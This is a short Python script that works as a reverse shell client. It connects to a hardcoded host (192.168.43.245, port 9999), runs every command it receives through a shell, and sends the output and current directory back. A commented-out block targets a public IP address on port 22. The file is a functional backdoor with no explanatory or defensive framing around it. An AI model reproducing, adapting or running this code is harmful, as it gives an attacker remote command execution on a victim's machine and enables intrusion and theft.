import socket
import os
import subprocess
import sys
import time
# try:
#     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     print ("Socket successfully created")
# except socket.error as err:
#     print ("socket creation failed with error %s" %(err))
#
# # default port for socket
# port = 22
#
# try:
#     host_ip = socket.gethostbyname('178.62.61.212')
# except socket.gaierror:
#     # this means could not resolve the host
#     print ("there was an error resolving the host")
#     sys.exit()
# time.sleep(5)
# # connecting to the server
# s.connect((host_ip,port))
s = socket.socket()
host = '192.168.43.245'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)
